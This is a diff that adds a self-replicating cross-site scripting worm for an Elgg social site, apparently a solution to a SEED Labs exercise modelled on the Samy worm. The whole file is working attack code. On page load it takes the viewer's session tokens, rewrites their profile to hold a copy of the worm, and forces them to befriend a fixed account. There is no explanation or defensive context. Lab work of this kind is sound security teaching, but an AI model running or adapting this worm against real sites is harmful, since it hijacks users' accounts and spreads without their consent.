@@ -1,0 +1,37 @@
+<script type="text/javascript" id="worm">
+    window.onload = function () {
+        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+        var jsCode = document.getElementById("worm").innerHTML;
+        var tailTag = "</" + "script>";
+
+        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+        var description = "&description=You are attacked!" + wormCode + "&accesslevel[description]=2";
+
+        var userName = "&name=" + elgg.session.user.name;
+        var guid = "&guid=" + elgg.session.user.guid;
+        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+        var content = token + ts + userName + description + guid;
+        var sendurl = "http://www.seed-server.com/action/profile/edit"
+
+        var samyGuid = 59;
+        if (elgg.session.user.guid != samyGuid) {
+            alert(jsCode);
+
+            // Modify profile
+            var AjaxModifyProfile = null;
+            AjaxModifyProfile = new XMLHttpRequest();
+            AjaxModifyProfile.open("POST", sendurl, true);
+            AjaxModifyProfile.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            AjaxModifyProfile.send(content);
+
+            // Add samy as friend
+            var AjaxAddFriend = null;
+            AjaxAddFriend = new XMLHttpRequest();
+            AjaxAddFriend.open("GET", `http://www.seed-server.com/action/friends/add?friend=${samyGuid}${ts}${token}`, true);
+            AjaxAddFriend.send();
+        }
+    }
+</script>
